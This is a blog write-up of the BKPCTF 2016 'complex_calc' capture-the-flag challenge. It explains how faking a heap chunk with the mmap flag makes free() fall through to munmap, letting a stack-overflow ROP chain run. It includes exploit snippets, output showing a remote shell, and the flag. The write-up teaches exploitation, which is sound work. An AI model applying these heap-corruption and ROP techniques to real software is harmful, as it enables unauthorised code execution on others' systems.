---
layout: post
title: BKPCTF 2016 - Complex Calc
author: hugsy
author_twitter: _hugsy_
author_email: hugsy@[RemoveThisPart]blah.cat
author_github: hugsy
tags: exploit gef ida bkpctf-2016 x86 heap-overflow
---

The challenge is the sequel to `simple_calc`. If you haven't read our
[write-up](/2016/03/07/bkpctf-2016-simple-calc-writeup.html), now is the time :)


### Info ###

The vulnerable file is
[here](http://s000.tinyupload.com/?file_id=13818394247839189362).

{% highlight bash %}
~ $ file d60001db1a24eca410c5d102410c3311d34d832c
d60001db1a24eca410c5d102410c3311d34d832c: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
~ $ checksec.sh --file d60001db1a24eca410c5d102410c3311d34d832c
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   d60001db1a24eca410c5d102410c3311d34d832c
{% endhighlight %}


### Vulnerability ###

At the very first look, `simple_calc` and `complex_calc` look totally
similar. Both are statically compiled, same protections, the vulnerability is
located at the same spot (i.e. stack overflow with a malloc-ed buffer we fully
control). Let's do some bindiffing!

<!--more-->

One of my new toys for quite a few months now is IDA Python plugin
[diaphora](https://github.com/joxeankoret/diaphora) by Joxean Koret (aka
{% include icon-twitter.html username="matalaz" %}). By diffing then, the issue is immediately visible:

{% include image.html src="https://i.imgur.com/0tkaNNT.png" alt="BinDiff with Diaphora" %}

The `free()` function was modified so we cannot benefit from the graceful exit
of the function by simply passing a NULL pointer. Now, `free()` will always
proceed with the address given as first parameter (therefore stored in $rdi).

So let's see how `free()`
works. [Some blogs](https://kitctf.de/writeups/0ctf2015/freenote/) already explain very well how
[Glibc heap is structured](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/)
and how
[heap](http://phrack.org/issues/57/9.html)
[corruptions](http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup)
work. So I will assume you know as well.

To stand on common ground, here is what a heap chunk looks like:

{% include image.html alt="ptmalloc heap structure" src="https://i.imgur.com/EVnKlBg.png" %}

When `free()` is called, some checks are made to know how the chunk must be
deallocated:

   1. If its size is below `MMAP_THRESHOLD` (default 128KB), then the chunk is
      deallocated and inserted into the free chunk doubly linked list. The
      pointers of the list are updated using the `unlink` macro.
   1. If the size is higher than `MMAP_THRESHOLD`, then the chunk was not
      allocated via the `brk`/`sbrk` syscall, but mapped in memory via the
      syscall `mmap`. If this heap chunk is mmaped, then its size will be a
      multiple of 2 (i.e. size & 2 = 2).

This actually shows quite well in the flow graph:

{% include image.html alt="IDA flow graph" src="https://i.imgur.com/omGULMz.png" %}

Since we control what is written in the heap (same method than `simple_calc`),
we can control whether we want to deallocate using `unlink` or `munmap` (simply
by or-ing the QWORD interpreter as the chunk size with 2). If we go for using
the regular deallocator, we need to fake our heap chunk in such a way that it will
pass all the checks performed later on. Any failure on the address will
`abort()` the program, making it enable to reach the `ret` instruction, and
therefore triggering our ROP chain.

On the other hand, the `munmap()` function is actually fairly straight-forward:

{% highlight bash %}
.text:0000000000435670 munmap          proc near               ; CODE XREF: __assert_fail_base+110
.text:0000000000435670                                         ; _nl_load_domain+4C9 ...
.text:0000000000435670                 mov     eax, 0Bh        ; Alternative name is '__munmap'
.text:0000000000435675                 syscall
.text:0000000000435677                 cmp     rax, -0FFFh
.text:000000000043567D                 jnb     __syscall_error
.text:0000000000435683                 retn
.text:0000000000435683 munmap          endp
{% endhighlight %}

If the syscall fails, it will nicely set $rax to a negative value and
return back to `free()`, which will return (in error as well but we don't care)
to our main loop, which can then return nicely too and trigger our
code. Perfect! Let's go with this!


### Exploitation ###

So we are going to use the arithmetic operators and result locations in the
`.bss` since they are at predictable, bearing in mind that each one of them is
only a DWORD (whereas we are here on x86-64 architecture). We will want to set
the following mapping:

{% highlight bash %}
.bss:00000000006C4A88 add_result      dd ?                    ; <-- previous chunk size
.bss:00000000006C4A8C                 align 10h
.bss:00000000006C4A90 div_operator_1  dd ?                    ; <-- chunk size (need to | 2 for flag IS_MMAPED)
.bss:00000000006C4A94 div_operator_2  dd ?                    ; <--
.bss:00000000006C4A98 div_result      dd ?                    ; <-- free will point @this chunk
.bss:00000000006C4A9C                 align 10h
{% endhighlight %}

We will point the $rdi used by the `free()` call pointing to `div_result`. But
now which value should we use then for operator_1 and operator_2 ?

Let's go back to `free()` flow graph:

{% include image.html alt="flowgraph of free()" src="https://i.imgur.com/7ZEy4nD.png" %}

As we see, several conditions must be filled:

   1. `chunk_size = div_operator_2 | div_operator_1` (and **must** be divisible by 2).
   1. `prev_size  = dword_padding  | add_result`
   1. `0x0fff & ((@prev_size-prev_size) | (prev_size+size&0xfff...ff8)) == 0`

If we passed those checks, $rcx will have the address to `munmap()`, and $rsi
the range to deallocate. `add_result` is at 0x6C4A88 so we must ensure the three
last nibbles end with 0xa88 to nullify the substration. We decide to store in
`add_result` the value 0x0x11111a88 as the addition of 0x11110a88 and 0x1000

{% highlight python %}
    # set add_result
    s.read_until("=> ")
    op1 = 0x11110a88
    op2 = 0x00001000
    do_add(s, op1, op2)
    ok("prev_size=%#x+%#x=%#x" % (op2, op1, op1+op2))
{% endhighlight %}

Now that we have `prev_size`, we can make up a value for `size` too. But here is
the trick, the value of `size` will end in $rdi when `munmap` syscall will
happen. If we point to a valid address, it will be unmapped and our exploit will
fail. So to be safe, we will use a huge valid and let the kernel throw us away
:) Here we used 0x7fffdeaa0000.

`size = 0x7fffdeaa0000 - 0x11111a88 = 0x9ffffeee578`

Splitting the result into 2 DWORD and we have div_operator_1=0xfffeee578 and
div_operator_2=0x9f.

{% highlight python %}
    # set div_1 and div_2
    s.read_until("=> ")
    op2, op1  = 0x9f, 0xfffeee578 | 2
    do_div(s, op1, op2)
    ok("size=0x%.8x%.8x" % (op2, op1))
{% endhighlight %}

The rest of the exploit is exactly similar to the one used for `simple_calc`!

Fire up!
{% highlight bash %}
$ ./complex_calc.py                                                                                                                                       [23:43]
[+] Connected to simplecalc.bostonkey.party:5500
[+] Running 47 calculations
[+] Building fake chunk 0x6c4a98
[+] prev_size=0x1000+0x11110a88=0x11111a88
[+] size=0x0000009ffffeee57a
[+] Got it, interacting (Ctrl-C to break)
[+] Get a PTY with ' python -c "import pty;pty.spawn('/bin/bash')"  '
cat key
BKPCTF{th3 l4st 1 2 3z}
{% endhighlight %}

And we get `BKPCTF{th3 l4st 1 2 3z}`

The full exploit is [here](https://gist.github.com/hugsy/7bcb5db17b75a86ae3bd).
